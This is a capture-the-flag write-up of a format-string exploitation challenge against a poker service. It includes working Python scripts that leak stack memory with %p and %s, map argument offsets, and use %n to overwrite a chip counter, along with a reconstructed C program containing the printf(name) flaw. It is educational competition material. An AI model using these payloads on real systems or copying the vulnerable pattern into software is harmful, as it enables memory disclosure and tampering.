---
title: "Small Blind - UTCTF 2026 write up"
date: 2026-03-17
categories: [CTF, Tournament]
tags: [UTCTF, pwn]
description: "No Description"
---

## Challenge Description
Come play some poker! You've got 500 chips and a shot to double up. The flag's behind a win condition, but a good poker player knows there's always more than one way to win.
> nc challenge.utctf.live 7255

## Challenge Overview
This is a pwnable challenge with no binary or source provided to players. I first used netcat to inspect the service:

![Test Game](https://www.notion.so/image/attachment%3A57c42783-cf75-4a72-9b86-2323986b1f60%3Aimage.png?table=block&id=3251b638-5371-8056-865b-cbc410a15e51&spaceId=a781b638-5371-818f-8f7e-000357107d6a&width=1420&userId=&cache=v2)

Based on the screenshot, this is a poker game. The player and dealer each start with 500 chips. The player provides a `name` and can select one of four actions: `check`, `call`, `raise <n>`, or `fold`.

## Challenge Analysis
After many netcat sessions, we determined the game's flow:
- The service prints a banner and prompts `Enter your name:`; it stores the input and prints a welcome message that includes the name.
- If the player chooses to play:
  - the poker hand state machine runs (preflop/flop/turn/river),
  - chips are settled,
  - control returns to the menu.
- On exit the service checks an end condition and prints the flag if it is satisfied.

Because the program echoes the supplied name back to stdout, we suspected a **format-string vulnerability**. The vulnerable code might look like this:
```c
// input name and store intro a c-string
char *playerName = name
printf("Welcome to the table, ");
printf(playerName);
```

Run netcat again to check this prediction, we have this result:

![vuln](https://www.notion.so/image/attachment%3A0d400d23-9a1a-41c0-9de9-8a6056da85af%3Aimage.png?table=block&id=3251b638-5371-80ad-a0ee-c92672d1ac95&spaceId=a781b638-5371-818f-8f7e-000357107d6a&width=1420&userId=&cache=v2)

This confirms the suspicion. Next we needed to determine the win condition, so I tried pushing the game into boundary states by always using `raise 480`. I chose `raise 480` because raising less than 480 produces a smaller pot that doesn't reach the maximum stage, while raising 490 or 500 is often rejected.

Both players start with 500 chips, so the most extreme distribution is `1000-0`. I used that hypothesis in a script to check the win condition:
```python
import argparse
import re
import socket
import time
from pathlib import Path
from typing import Optional, Tuple

HOST = "challenge.utctf.live"
PORT = 7255
PLAY_PROMPT = "Play a hand? (y to play / n to exit / t to toggle Unicode suits [currently on]):"
ACTION_PREFIX = "Action ("


def send_line(sock: socket.socket, line: str) -> None:
    sock.sendall((line + "\n").encode())


def recv_until(sock: socket.socket, buf: str, marker: str, timeout: float = 4.0) -> Tuple[str, str]:
    end = time.time() + timeout
    while marker not in buf:
        if time.time() > end:
            raise TimeoutError(f"timeout waiting for marker: {marker}")
        data = sock.recv(4096)
        if not data:
            raise ConnectionError("remote closed")
        buf += data.decode(errors="replace")
    idx = buf.index(marker) + len(marker)
    return buf[:idx], buf[idx:]


def recv_action_prompt(sock: socket.socket, buf: str, timeout: float = 4.0) -> Tuple[str, str]:
    end = time.time() + timeout
    while True:
        idx = buf.find(ACTION_PREFIX)
        if idx != -1:
            colon = buf.find(":", idx)
            if colon != -1:
                prompt = buf[idx : colon + 1]
                return prompt, buf[colon + 1 :]

        if time.time() > end:
            raise TimeoutError("timeout waiting action prompt")

        data = sock.recv(4096)
        if not data:
            raise ConnectionError("remote closed")
        buf += data.decode(errors="replace")


def parse_last_chips(text: str) -> Tuple[Optional[int], Optional[int]]:
    m = re.findall(r"Your chips:\s*(\d+)\s*\|\s*Dealer chips:\s*(\d+)", text)
    if not m:
        return None, None
    y, d = m[-1]
    return int(y), int(d)


def play_to_menu(sock: socket.socket, buf: str, transcript: str, aggressive: bool = False) -> Tuple[str, str]:
    # Keep the hand moving with check/call so showdown can resolve naturally.
    deadline = time.time() + 12.0
    while time.time() < deadline:
        if PLAY_PROMPT in buf:
            cut = buf.index(PLAY_PROMPT) + len(PLAY_PROMPT)
            transcript += buf[:cut]
            buf = buf[cut:]
            return buf, transcript

        idx = buf.find(ACTION_PREFIX)
        if idx != -1:
            colon = buf.find(":", idx)
            if colon != -1:
                prompt = buf[idx : colon + 1]
                transcript += buf[: colon + 1]
                buf = buf[colon + 1 :]
                if "check" in prompt:
                    send_line(sock, "check")
                elif "call" in prompt:
                    send_line(sock, "call")
                else:
                    send_line(sock, "fold")
                continue

        try:
            data = sock.recv(4096)
        except (TimeoutError, socket.timeout):
            continue

        if not data:
            break
        chunk = data.decode(errors="replace")
        buf += chunk
        transcript += chunk

    raise TimeoutError("did not return to play menu in time")


def single_attempt(name: str, aggressive: bool = False, max_hands: int = 2) -> Tuple[bool, str, Tuple[Optional[int], Optional[int]]]:
    transcript = ""
    with socket.create_connection((HOST, PORT), timeout=8) as sock:
        sock.settimeout(1.5)
        buf = ""

        # Login
        chunk, buf = recv_until(sock, buf, "Enter your name:")
        transcript += chunk
        send_line(sock, name)

        # Menu -> start hand 1
        chunk, buf = recv_until(sock, buf, PLAY_PROMPT)
        transcript += chunk
        send_line(sock, "y")

        # Hand 1: force near all-in from SB spot
        prompt, buf = recv_action_prompt(sock, buf)
        transcript += prompt
        if "call 10 / raise <n> / fold" in prompt:
            send_line(sock, "raise 480")
        elif "check / raise <n> / fold" in prompt:
            send_line(sock, "raise 480")
        else:
            send_line(sock, "fold")

        # Finish hand 1 and return to menu
        buf, transcript = play_to_menu(sock, buf, transcript, aggressive=aggressive)
        y1, d1 = parse_last_chips(transcript)

        y2, d2 = y1, d1
        hands_played = 1
        while hands_played < max_hands:
            if (y2, d2) == (1000, 0):
                break
            if y2 is None or d2 is None:
                break
            if y2 <= 0 or d2 <= 0:
                break

            send_line(sock, "y")
            buf, transcript = play_to_menu(sock, buf, transcript, aggressive=aggressive)
            y2, d2 = parse_last_chips(transcript)
            hands_played += 1

        # Exit cleanly
        send_line(sock, "n")
        end = time.time() + 1.0
        while time.time() < end:
            try:
                data = sock.recv(4096)
            except (TimeoutError, socket.timeout):
                break
            if not data:
                break
            transcript += data.decode(errors="replace")

    return (y2, d2) == (1000, 0), transcript, (y1, d1)


def main() -> int:
    parser = argparse.ArgumentParser(description="Retry remote sessions until chips become exactly 1000-0")
    parser.add_argument("--attempts", type=int, default=400, help="Maximum sessions to try")
    parser.add_argument("--aggressive", action="store_true", help="Use more assertive line selection and play extra hands")
    parser.add_argument("--max-hands", type=int, default=2, help="Maximum hands to play per session")
    parser.add_argument(
        "--save",
        type=Path,
        default=Path("blind/1000_0_transcript.txt"),
        help="Where to save the successful transcript",
    )
    args = parser.parse_args()

    for i in range(1, args.attempts + 1):
        try:
            ok, transcript, hand1 = single_attempt(
                name=f"hunt{i}",
                aggressive=args.aggressive,
                max_hands=max(2, args.max_hands),
            )
            y, d = parse_last_chips(transcript)
            print(f"[attempt {i}] hand1={hand1} final={y}-{d}")
            if ok:
                args.save.parent.mkdir(parents=True, exist_ok=True)
                args.save.write_text(transcript, encoding="utf-8")
                print(f"[+] Hit target 1000-0 on attempt {i}")
                print(f"[+] Saved transcript to {args.save}")
                return 0
        except Exception as exc:
            print(f"[attempt {i}] error: {exc}")
            time.sleep(0.08)

    print("[!] END")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
```

Run command:
```bash
python3 name.py --attempts 10 --aggressive --max-hands 4
```

Here is the result:
```bash
[attempt 1] hand1=(990, 10) final=990-10
[attempt 2] hand1=(10, 990) final=10-990
[attempt 3] hand1=(990, 10) final=990-10
[attempt 4] hand1=(990, 10) final=990-10
[attempt 5] hand1=(520, 480) final=460-540
[attempt 6] hand1=(990, 10) final=990-10
[attempt 7] hand1=(10, 990) final=10-990
[attempt 8] hand1=(10, 990) final=10-990
[attempt 9] hand1=(10, 990) final=10-990
[attempt 10] hand1=(990, 10) final=990-10
[!] Target 1000-0 not reached within attempt budget
```

I automated `raise 480` for each hand. The output shows different outcomes for the same input, indicating settlement inconsistencies; the behavior is stochastic and not reliably exploitable remotely.

We did not observe `1000-0`, so it is likely not the required win condition. We hypothesize the win gate may be based on `your_chips > 1000`.

From this analysis, we reconstructed a plausible implementation of the service:
```c
#include <stdio.h>
#include <stdlib.h>

int main(void) {
    char name[256];
    int your_chips = 500;
    int dealer_chips = 500;

    puts("Enter your name:");
    fgets(name, sizeof(name), stdin);

    // Vulnerability: uncontrolled format string
    printf("Welcome to the table, ");
    printf(name);                  // <-- format string vulnerability
    printf("!\n");

    while (1) {
        printf("Your chips: %d | Dealer chips: %d\n", your_chips, dealer_chips);
        printf("Play a hand? (y to play / n to exit): ");

        char cmd[16];
        if (!fgets(cmd, sizeof(cmd), stdin)) break;

        if (cmd[0] == 'n') {
            // Inferred win gate from behavior
            if (your_chips > 1000) {
                puts("utflag{...}");
            } else {
                puts("Better luck next time.");
            }
            break;
        }

        // Poker hand engine here
        // ... complex game logic omitted in real service
    }

    return 0;
}
```

Now we have the basic information. Next, we'll create scripts to dynamically analyze the service:
1. Confirm leak primitive (`%p`) using payloads like `%i$p` across many indices.
2. Confirm read primitive (`%s`) using payloads like `%i$s` for candidate indices.
3. Confirm write primitive (`%n`), e.g. `%1000c%6$n` to alter dealer chips or `%1000c%7$n` to alter player chips.

Here is the script for step 1 and 2:
```python
import re
import socket
import string
from typing import Optional

HOST = "challenge.utctf.live"
PORT = 7255
FLAG_RE = re.compile(r"[A-Za-z0-9_]*\{[^\n{}]{3,}\}")


def get_welcome_value(payload: str, timeout: float = 0.65) -> Optional[str]:
    try:
        s = socket.create_connection((HOST, PORT), timeout=2.0)
    except OSError:
        return None
    s.settimeout(timeout)
    try:
        try:
            banner = s.recv(4096).decode(errors="replace")
        except (TimeoutError, socket.timeout, OSError):
            return None
        if "Enter your name:" not in banner:
            return None
        s.sendall((payload + "\n").encode())

        out = ""
        for _ in range(4):
            try:
                data = s.recv(4096)
            except (TimeoutError, socket.timeout, OSError):
                break
            if not data:
                break
            out += data.decode(errors="replace")
            if "Play a hand?" in out:
                break

        m = re.search(r"Welcome to the table, (.*?)!", out, re.S)
        if not m:
            return None
        return m.group(1)
    finally:
        s.close()


def printable(s: str) -> str:
    return "".join(ch if ch in string.printable and ch not in "\r\n\t" else "." for ch in s)


def main() -> int:
    print("[*] Stage 1: leak stack args with %i$p")
    ptr_map: dict[int, str] = {}
    for i in range(1, 70):
        payload = f"%{i}$p"
        v = get_welcome_value(payload)
        if v is None:
            continue
        v = v.strip()
        ptr_map[i] = v
        if i % 10 == 0:
            print(f"    - scanned {i} offsets")

    for i in sorted(ptr_map):
        v = ptr_map[i]
        if v not in ("(nil)", "0x0"):
            print(f"[p] {i:3d}: {v}")

    print("\n[*] Stage 2: dereference candidate pointers with %i$s")
    candidates = []
    for i, v in ptr_map.items():
        if not v.startswith("0x"):
            continue
        try:
            n = int(v, 16)
        except ValueError:
            continue
        if n <= 0x1000:
            continue
        candidates.append(i)

    seen = set()
    for i in sorted(set(candidates)):
        payload = f"%{i}$s"
        v = get_welcome_value(payload, timeout=0.55)
        if not v:
            continue
        pv = printable(v)
        if len(pv) < 4:
            continue
        key = pv[:80]
        if key in seen:
            continue
        seen.add(key)
        print(f"[s] {i:3d}: {pv[:220]}")
        m = FLAG_RE.search(v)
        if m:
            print(f"[+] FLAG FOUND: {m.group(0)}")
            return 0

    print("[!] No direct flag string leaked in scanned offsets.")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
```

Here is the output of this code:
```bash
$ python3 fmt_scan.py
[*] Stage 1: leak stack args with %i$p
    - scanned 10 offsets
    - scanned 20 offsets
    - scanned 30 offsets
    - scanned 40 offsets
    - scanned 50 offsets
    - scanned 60 offsets
[p]   1: 0x7ffda1665450
[p]   4: 0x16
[p]   5: 0x16
[p]   6: 0x7ffd96938398
[p]   7: 0x7ffdbcfd166c
[p]   8: 0x7ffdf83d1d10
[p]   9: 0x4034c3
[p]  13: 0x7ffd3bc0efe5
[p]  20: 0x400040
[p]  21: 0xd
[p]  22: 0x7fff1af2fc40
[p]  23: 0x7ffee3cbcc99
[p]  24: 0x7f347cca65e0
[p]  25: 0x40372d
[p]  26: 0x7f0d657a72e8
[p]  27: 0x4036e0
[p]  29: 0x1f4000001f4
[p]  30: 0x7fff40a166d0
[p]  33: 0x7f6b5ea5b083
[p]  34: 0x100000006
[p]  35: 0x7ffe50956d78
[p]  36: 0x16ec977a0
[p]  37: 0x403464
[p]  38: 0x4036e0
[p]  39: 0x3eac8cb44490c1ff
[p]  40: 0x401230
[p]  41: 0x7ffe13e278e0
[p]  44: 0xc0a0861aa8ffdda8
[p]  45: 0x10b87249fefe49d8
[p]  49: 0x1
[p]  50: 0x7fffd3a32788
[p]  51: 0x7ffe10122eb8
[p]  52: 0x7fbe22635190
[p]  55: 0x401230
[p]  56: 0x7ffd42ec7890
[p]  59: 0x40125e
[p]  60: 0x7ffe71cfff88
[p]  61: 0x1c
[p]  62: 0x1
[p]  63: 0x7ffd5b852e84
[p]  65: 0x7fffeaf87e92
[p]  66: 0x7ffd76754ea6
[p]  67: 0x7ffda9ebeeb1
[p]  68: 0x7fffa6340ec3
[p]  69: 0x7ffc39fbded1

[*] Stage 2: dereference candidate pointers with %i$s
[s]   1: Welcome to the table, 00  each               ..
[s]   9: .E...E.
[s]  13: 3978
[s]  22: .gTn.
[s]  23: x86_64
[s]  24: ....UH..t.
[s]  25: H...H9.u.H...[]A\A]A^A_.ff....
[s]  27: ....AWL.=#7
[s]  33: ...).
[s]  35: ......
[s]  37: ....UH..H..
[s]  40: ....1.I..^H..H...PTI..P7@
[s]  50: .~....
[s]  51: ...W..
[s]  59: .......f....
[s]  63: /build/poker
[s]  65: MAIL=/var/mail/poker
[s]  66: USER=poker
[s]  67: HOME=/home/poker
[s]  68: LOGNAME=poker
[s]  69: PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
[!] No direct flag string leaked in scanned offsets.
```

Interpretation:
- The format string is interpreted by the service.
- Positional argument access works.
- The service dereferences argument pointers and reads memory as C-strings.

Next, for stage 3, I wrote this script:
```python
import argparse
import re
import socket
import time
from pathlib import Path


DEFAULT_HOST = "challenge.utctf.live"
DEFAULT_PORT = 7255
ENTER_PROMPT = "Enter your name:"
PLAY_PROMPT = "Play a hand?"
ACTION_PROMPT = "Action ("


def recv_some(sock: socket.socket, timeout: float) -> str:
    sock.settimeout(timeout)
    chunks = []
    while True:
        try:
            data = sock.recv(4096)
        except (TimeoutError, socket.timeout):
            break
        if not data:
            break
        chunks.append(data)
        if len(data) < 4096:
            break
    return b"".join(chunks).decode(errors="replace")


def send_line(sock: socket.socket, line: str) -> None:
    sock.sendall((line + "\n").encode())


def wait_for_marker(sock: socket.socket, marker: str, timeout: float, transcript: str) -> tuple[bool, str]:
    end = time.time() + timeout
    buf = transcript
    while time.time() < end:
        if marker in buf:
            return True, buf
        piece = recv_some(sock, timeout=0.35)
        if piece:
            buf += piece
    return marker in buf, buf


def extract_summary(transcript: str) -> str:
    welcome = re.search(r"Welcome to the table, (.*?)!", transcript, re.S)
    chips = re.findall(r"Your chips:\s*(\d+)\s*\|\s*Dealer chips:\s*(\d+)", transcript)
    parts = []
    if welcome:
        w = welcome.group(1).replace("\n", " ").strip()
        if len(w) > 80:
            w = w[:77] + "..."
        parts.append(f"welcome={w!r}")
    if chips:
        y, d = chips[-1]
        parts.append(f"chips={y}-{d}")
    if "{" in transcript and "}" in transcript:
        m = re.search(r"[A-Za-z0-9_]*\{[^\n{}]+\}", transcript)
        if m:
            parts.append(f"flag={m.group(0)}")
    return " | ".join(parts) if parts else "no-summary"


def run_single(
    host: str,
    port: int,
    name_payload: str,
    queued_lines: list[str],
    auto_next: bool,
    timeout: float,
) -> tuple[int, str]:
    transcript = ""
    queue = list(queued_lines)

    with socket.create_connection((host, port), timeout=8) as sock:
        sock.settimeout(1.2)

        ok, transcript = wait_for_marker(sock, ENTER_PROMPT, timeout, transcript)
        if not ok:
            return 1, transcript

        send_line(sock, name_payload)
        print(f"[send:name] {name_payload}")

        # Read response right after name payload.
        transcript += recv_some(sock, timeout=1.0)

        if auto_next and queue:
            end = time.time() + timeout
            while queue and time.time() < end:
                # Keep pulling output until one of the prompts appears.
                transcript += recv_some(sock, timeout=0.4)
                if PLAY_PROMPT in transcript or ACTION_PROMPT in transcript:
                    line = queue.pop(0)
                    send_line(sock, line)
                    print(f"[send] {line}")
                    transcript += recv_some(sock, timeout=0.8)

        elif queue:
            # Non-auto mode: send all queued lines immediately.
            for line in queue:
                send_line(sock, line)
                print(f"[send] {line}")
                transcript += recv_some(sock, timeout=0.8)

        # Final drain.
        transcript += recv_some(sock, timeout=1.0)

    return 0, transcript


def main() -> int:
    parser = argparse.ArgumentParser(description="Send payloads to poker service and capture transcript")
    parser.add_argument("--host", default=DEFAULT_HOST, help="Target host")
    parser.add_argument("--port", type=int, default=DEFAULT_PORT, help="Target port")
    parser.add_argument("--name", default=None, help="Payload to send as name")
    parser.add_argument(
        "--batch-name",
        action="append",
        default=[],
        help="Batch mode: payload as name (repeat this flag for multiple payloads)",
    )
    parser.add_argument(
        "--send",
        action="append",
        default=[],
        help="Additional lines to send after login (can be repeated, e.g. --send y --send n)",
    )
    parser.add_argument(
        "--auto-next",
        action="store_true",
        help="Send queued --send lines when Play/Action prompt appears",
    )
    parser.add_argument(
        "--auto-exit",
        action="store_true",
        help="Ensure command 'n' is queued (useful in batch mode)",
    )
    parser.add_argument("--timeout", type=float, default=8.0, help="Overall wait timeout per stage")
    parser.add_argument("--save", type=Path, default=None, help="Optional file path to save full transcript")
    args = parser.parse_args()

    payloads: list[str] = []
    if args.name is not None:
        payloads.append(args.name)
    payloads.extend(args.batch_name)

    if not payloads:
        print("[-] Provide --name or at least one --batch-name")
        return 2

    queue = list(args.send)
    if args.auto_exit and "n" not in queue:
        queue.append("n")

    if len(payloads) == 1:
        rc, transcript = run_single(
            host=args.host,
            port=args.port,
            name_payload=payloads[0],
            queued_lines=queue,
            auto_next=args.auto_next,
            timeout=args.timeout,
        )
        if rc != 0:
            print("[-] Did not receive name prompt")
            print(transcript[-1000:])
            return rc

        if args.save is not None:
            args.save.parent.mkdir(parents=True, exist_ok=True)
            args.save.write_text(transcript, encoding="utf-8")
            print(f"[+] Saved transcript to {args.save}")

        print("\n===== Transcript Tail =====")
        print(transcript[-2500:])
        return 0

    save_dir = args.save
    if save_dir is not None:
        save_dir.parent.mkdir(parents=True, exist_ok=True)

    ok_count = 0
    print(f"[*] Batch mode: {len(payloads)} payload(s)")
    for idx, payload in enumerate(payloads, start=1):
        print(f"\n=== [{idx}/{len(payloads)}] payload={payload!r} ===")
        try:
            rc, transcript = run_single(
                host=args.host,
                port=args.port,
                name_payload=payload,
                queued_lines=queue,
                auto_next=args.auto_next,
                timeout=args.timeout,
            )
        except Exception as exc:
            print(f"[!] error: {exc}")
            continue

        if rc != 0:
            print("[-] no name prompt")
            continue

        ok_count += 1
        print(f"[summary] {extract_summary(transcript)}")

        if save_dir is not None:
            out_path = save_dir.with_name(f"{save_dir.stem}_{idx}{save_dir.suffix or '.txt'}")
            out_path.write_text(transcript, encoding="utf-8")
            print(f"[+] saved {out_path}")

    print(f"\n[*] Batch done: {ok_count}/{len(payloads)} succeeded")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

Run command:
```bash
$ python3 send_payload.py --name %1000c%7\$n --send n --auto-next
$ python3 send_payload.py --name %1000c%6\$n --send n --auto-next
```

Result:

![six](https://www.notion.so/image/attachment%3A285754f2-dacb-4ad5-896f-c714619e14b0%3Aimage.png?table=block&id=3251b638-5371-80cf-8eb9-ffd6c3e44634&spaceId=a781b638-5371-818f-8f7e-000357107d6a&width=1420&userId=&cache=v2)

![seven](https://www.notion.so/image/attachment%3Aad79d262-9d8c-4401-8f71-b37eec3b25d8%3Aimage.png?table=block&id=3251b638-5371-80ce-a326-d5d98ad6be26&spaceId=a781b638-5371-818f-8f7e-000357107d6a&width=1420&userId=&cache=v2)

From the results, the mapping appears to be:
- `your_chips` → format argument `#7`
- `dealer_chips` → format argument `#6`

## Exploitation
Based on the analysis, the final exploit script is:
```python
import re
import socket

HOST = "challenge.utctf.live"
PORT = 7255
FLAG_RE = re.compile(r"[A-Za-z0-9_]*\{[^\n{}]+\}")


def recv_some(sock: socket.socket, rounds: int = 8) -> str:
    out = ""
    for _ in range(rounds):
        try:
            data = sock.recv(4096)
        except (TimeoutError, socket.timeout):
            break
        if not data:
            break
        out += data.decode(errors="replace")
    return out


def main() -> int:
    # Vulnerability: server does printf(name) directly.
    # %1001c prints 1001 chars, then %7$n writes 1001 into the integer pointer at arg #7.
    # In this binary, arg #7 maps to your chip counter.
    payload = "%1001c%7$n"

    with socket.create_connection((HOST, PORT), timeout=8) as sock:
        sock.settimeout(1.2)

        banner = recv_some(sock, rounds=4)
        if "Enter your name:" not in banner:
            print("[-] Unexpected banner, cannot continue")
            return 1

        sock.sendall((payload + "\n").encode())
        text = banner + recv_some(sock, rounds=10)

        m = re.search(r"Your chips:\s*(\d+)\s*\|\s*Dealer chips:\s*(\d+)", text)
        if m:
            print(f"[*] Chip state after payload: you={m.group(1)} dealer={m.group(2)}")

        # Exit cleanly; service prints final result path, including flag when threshold is met.
        sock.sendall(b"n\n")
        text += recv_some(sock, rounds=10)

        fm = FLAG_RE.search(text)
        if not fm:
            print("[-] Flag not found. Tail output:")
            print("\n".join(text.splitlines()[-20:]))
            return 1

        print(f"[+] FLAG: {fm.group(0)}")
        return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

Run result:
```bash
$ python3 exploit.py
[*] Chip state after payload: you=1001 dealer=500
[+] FLAG: utflag{counting_chars_not_cards}
```

## Technical Summary

### Techniques Used
- Black-box protocol reverse engineering
- Format string triad (`%p`, `%s`, `%n`)
- Positional argument mapping
- Deterministic state overwrite for win-gate bypass

### Vulnerability Classification
- CWE-134: Uncontrolled Format String
- Impact: arbitrary memory read/write in process context

### Lessons Learned
- In interactive game services, always test pre-game user fields first.
- If a challenge hints "more than one way to win", exploit path likely bypasses intended game logic.
- `%n` often turns a simple leak into complete game-state control.